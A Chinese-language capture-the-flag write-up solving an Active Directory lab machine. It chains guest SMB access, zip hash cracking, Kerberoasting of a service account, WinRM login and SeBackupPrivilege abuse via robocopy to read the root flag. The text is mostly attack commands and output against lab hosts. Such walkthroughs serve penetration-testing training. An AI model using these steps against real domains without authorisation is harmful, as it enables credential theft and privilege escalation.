

> 来源：Mazesec
>
> 靶机ID：826
>
> 难度：Baby
>
> 作者：111
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.133` 
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于2026-11-21 21:30

## Flag

| Flag | 值                                                | 位置                                                     |
| ---- | ------------------------------------------------- | -------------------------------------------------------- |
| user | `flag{user-6b1f4c9d-2a8e-4f3b-9c7d-1e5a8b2c6f04}` | `\\192.168.205.133\share\backup.zip` → `backup/user.txt` |
| root | `flag{root-d3e7a1b5-8c2f-4d6e-a9b4-7f1c3e5d8a02}` | `DC:C:\Users\Administrator\Desktop\root.txt`             |

## 攻击链

```text
1  guest 空口令
2    └─ share 共享 → backup.zip（AES-256）
3         └─ qaz123 → pass.txt → test:Baby@2026 ─ user flag
4              └─ Kerberoast ll104567（HTTP/DC.babyad1.dsz）→ !QAZ2wsx
5                   └─ WinRM 5985 + Backup Operators
6                        └─ SeBackupPrivilege → robocopy /B → root flag
```

## 一、信息收集

全端口扫描，目标只开了一组典型的 AD 端口。先看端口，再做服务识别。

```bash
nmap -n -Pn -p- --min-rate 3000 -T4 192.168.205.133 -oN nmap_all.txt
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

`53 + 88 + 389 + 445 + 5985` 这套组合基本就是域控。再做版本和脚本扫描：

```bash
nmap -n -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \
  192.168.205.133 -oN nmap_sv.txt
```

```text
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                            (Domain: babyad1.dsz, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC
```

域是 `babyad1.dsz`，主机名 `DC`。SMB signing 是 `enabled and required`，SMB relay 这条路直接排除，后面只能从凭据和 ACL 入手。

把域名写进 hosts，后面 Kerberos 和 LDAP 都会用到：

```bash
echo '192.168.205.133 dc.babyad1.dsz babyad1.dsz' >> /etc/hosts
```

## 二、SMB 与 backup.zip

先看 SMB。空会话本身能建立，但枚举共享会 `ACCESS_DENIED`；`guest` 空口令反而能读。

```bash
netexec smb 192.168.205.133
netexec smb 192.168.205.133 -u '' -p '' --shares
```

```text
SMB  192.168.205.133  445  DC  [*] Windows 10 / Server 2019 Build 17763 x64
                               (name:DC) (domain:babyad1.dsz)
                               (signing:True) (SMBv1:None) (Null Auth:True)
SMB  192.168.205.133  445  DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

换 `guest`：

```bash
netexec smb 192.168.205.133 -u guest -p '' --shares
```

```text
Share      Permissions  Remark
---------- ------------ ------
ADMIN$                  远程管理
C$                      默认共享
IPC$       READ         远程 IPC
NETLOGON                登录服务器共享
share      READ
SYSVOL                  登录服务器共享
```

`share` 可读。直接 spider 并下载：

```bash
netexec smb 192.168.205.133 -u guest -p '' -M spider_plus \
  -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/spider
```

```text
SPIDER_PLUS  [+] Total files found: 2
SPIDER_PLUS  [+] Downloads successful: 2
```

下载到两个文件：`readme.txt` 和 `backup.zip`。

```text
share/readme.txt
share/backup.zip
```

`readme.txt` 是运维备忘，内容很关键：

```text
# 运维临时备忘 (内部)

关于近期域控安全排查的通知：
1. 我们的自动化审计脚本发现部分服务账号密码存在弱口令风险，正在逐步重置。
2. 请各位运维人员注意，当前域环境已启用账户锁定策略（连续 5 次失败将锁定 30 分钟），
   排查密码时切勿使用自动化脚本进行在线喷洒（Spray），请通过合法途径离线验证或联系
   账号负责人。
3. 这里的 backup.zip 是上周备份的测试账号清单和部分配置文件，已加密。密码我已交接
   给新的负责人，如有需要请向他索要，不要尝试暴力破解。
4. 交接期间，请勿随意删改域内现有账号和组策略。
```

这段话有两个作用：一是告诉你账户锁定策略是 `5 次 / 30 分钟`，在线喷洒会锁号；二是把注意力引到 `backup.zip`。对攻击者来说，zip 是离线文件，锁定策略不影响破解。

先确认 zip 的加密方式：

```bash
unzip -l backup.zip
```

```text
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2026-11-04 16:47   backup/
      365  2026-11-04 17:07   backup/pass.txt
       47  2026-11-04 16:48   backup/user.txt
```

直接解压：

```bash
unzip backup.zip
```

```text
skipping: backup/pass.txt         unsupported compression method 99
skipping: backup/user.txt         unsupported compression method 99
```

`method 99` 是 AES-256，不是 ZipCrypto。`bkcrack` 那类明文攻击不适用，只能走口令破解。

```bash
zip2john backup.zip > zip.hash
cat zip.hash
```

```text
backup.zip/backup/pass.txt:$zip2$*0*3*0*52f63f0f640fe517aed2be36dfbb7d6e*...*$/zip2$:...
```

这里有个小坑：`zip2john` 的输出带文件名前缀，hashcat 直接吃会报 `No hashes loaded`。只取 `$zip2$...$/zip2$` 这一段：

```bash
cut -d: -f2 zip.hash > zip13600.hash
hashcat -m 13600 zip13600.hash /usr/share/wordlists/rockyou.txt
```

```text
$zip2$...*$/zip2$:qaz123
```

zip 密码是 `qaz123`。解压：

```bash
7z x -pqaz123 backup.zip
```

`pass.txt` 直接给了接入账号：

```text
# ==========================================
#  MazeSec Internal Assessment - 测试用户
# ==========================================
#  本文件为域渗透测试环境提供的接入账号，评估目标为获取域管理员
#  权限，并读取其桌面上的 root.txt。
#
#  账号
#    test : Baby@2026
# ==========================================
```

`user.txt` 就是 user flag：

```text
flag{user-6b1f4c9d-2a8e-4f3b-9c7d-1e5a8b2c6f04}
```

| 文件              | 内容               |
| ----------------- | ------------------ |
| `backup/pass.txt` | `test : Baby@2026` |
| `backup/user.txt` | user flag          |

到这里 user flag 结束。`test` 只是普通域用户，下一步用它枚举域内对象。

## 三、从 test 到 ll104567

先验证 `test` 的权限。SMB 能读，LDAP 能查，WinRM 不行：

```bash
netexec smb 192.168.205.133 -u test -p 'Baby@2026' --shares
netexec ldap 192.168.205.133 -u test -p 'Baby@2026' --users
```

```text
LDAP  [+] babyad1.dsz\test:Baby@2026
LDAP  [*] Enumerated 5 domain users: babyad1.dsz
      Administrator
      Guest
      krbtgt
      test
      ll104567
```

`ll104567` 这个账号是后加的：`Last PW Set` 和 `test` 同一天，而且名字像工号。再看 BloodHound：

```bash
bloodhound-python -u test -p 'Baby@2026' -d babyad1.dsz \
  -ns 192.168.205.133 -dc dc.babyad1.dsz -c All --zip
```

结果里 `test` 没有任何特殊 ACL；`ll104567` 的属性很显眼：

| 对象       | 关键属性                                                     |
| ---------- | ------------------------------------------------------------ |
| `test`     | 普通 `Domain Users`，无 SPN，无特权 ACE                      |
| `ll104567` | SPN `HTTP/DC.babyad1.dsz`；`adminCount=1`；`BUILTIN\Backup Operators`；`BUILTIN\Remote Management Users` |

先试 AS-REP roast。三个账号都没有 `UF_DONT_REQUIRE_PREAUTH`，打不出来：

```bash
impacket-GetNPUsers babyad1.dsz/ -dc-ip 192.168.205.133 \
  -usersfile users.txt -no-pass
```

```text
[-] User test doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ll104567 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

换 Kerberoast。`ll104567` 注册了 `HTTP/DC.babyad1.dsz`，用 `test` 的 LDAP 权限请求 TGS：

```bash
impacket-GetUserSPNs babyad1.dsz/test:'Baby@2026' \
  -dc-ip 192.168.205.133 -request -outputfile tgs.txt
```

```text
ServicePrincipalName  Name      MemberOf
--------------------  --------  --------------------------------------
HTTP/DC.babyad1.dsz   ll104567  CN=Remote Management Users,CN=Builtin,...
```

TGS 是 RC4（`$krb5tgs$23$`），hashcat 用 13100：

```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5tgs$23$*ll104567$BABYAD1.DSZ$...:!QAZ2wsx
```

得到 `ll104567 : !QAZ2wsx`。readme 里的账户锁定策略对离线破解没有作用；如果在线喷洒，5 次就锁 30 分钟。

## 四、WinRM 与 Backup Operators

`ll104567` 在 `Remote Management Users` 里，5985 直接能登录：

```bash
netexec winrm 192.168.205.133 -u ll104567 -p '!QAZ2wsx'
```

```text
WINRM  192.168.205.133  5985  DC  [+] babyad1.dsz\ll104567:!QAZ2wsx (Pwn3d!)
```

这里也有个小坑：`netexec winrm -x` 走 cmd 时会报 `no 'Invoke' rights to execute command (shell type: cmd)`，换成 `-X` 走 PowerShell 就能执行。这不是权限不够，是 WinRM shell 类型的问题。

看当前 token 的组和特权：

```bash
netexec winrm 192.168.205.133 -u ll104567 -p '!QAZ2wsx' -X 'whoami /all'
```

```text
组信息
BUILTIN\Backup Operators           别名
BUILTIN\Remote Management Users    别名
BUILTIN\Users                      别名
NT AUTHORITY\NETWORK
NT AUTHORITY\Authenticated Users
Mandatory Label\High Mandatory Level

特权信息
SeMachineAccountPrivilege    将工作站添加到域       已启用
SeBackupPrivilege            备份文件和目录         已启用
SeRestorePrivilege           还原文件和目录         已启用
SeShutdownPrivilege          关闭系统               已启用
SeChangeNotifyPrivilege      绕过遍历检查           已启用
```

`SeBackupPrivilege` 是这条链的关键。`Backup Operators` 不是 Domain Admin，但备份特权允许进程以 `FILE_FLAG_BACKUP_SEMANTICS` 打开任意文件，绕过 NTFS ACL。`SeRestorePrivilege` 则允许以备份语义写回。

Administrator 桌面上的 `root.txt` 对 `ll104567` 正常读取是拒绝的：

```powershell
Get-Content C:\Users\Administrator\Desktop\root.txt
# 无回显
```

用 `robocopy /B` 以备份模式复制到 `C:\Windows\Temp`：

```powershell
robocopy C:\Users\Administrator\Desktop C:\Windows\Temp root.txt /B /R:0 /W:0
```

```text
选项: /DCOPY:DA /COPY:DAT /B /R:0 /W:0
------------------------------------------------------------------------------
               1    C:\Users\Administrator\Desktop\
       新文件                49    root.txt
------------------------------------------------------------------------------
               文件:         1         1         0         0         0         0
               字节:        49        49         0         0         0         0
```

再正常读取：

```powershell
Get-Content C:\Windows\Temp\root.txt
```

```text
flag{root-d3e7a1b5-8c2f-4d6e-a9b4-7f1c3e5d8a02}
```

root flag 到手。